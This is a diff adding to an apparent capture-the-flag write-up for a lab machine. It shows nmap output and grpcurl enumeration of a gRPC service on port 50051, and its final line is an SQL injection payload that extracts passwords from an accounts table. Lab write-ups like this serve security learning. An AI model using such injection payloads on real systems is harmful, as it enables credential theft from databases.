@@ -27,3 +27,25 @@ PORT      STATE SERVICE VERSION
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+By googling, we found out that the port 50051 is generally used for gRPC service
+
+# gRPC (port 50051)
+There is an existing tool in Go language to communicate with gRPC service named grpcurl : https://github.com/fullstorydev/grpcurl
+So let's try it :
+```bash
+$ /home/kali/go/bin/grpcurl -plaintext pc.htb:50051 describe                                         
+SimpleApp is a service:
+service SimpleApp {
+  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+}
+grpc.reflection.v1alpha.ServerReflection is a service:
+service ServerReflection {
+  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
+}
+```
+
+
+80 union SELECT group_concat(password) from accounts
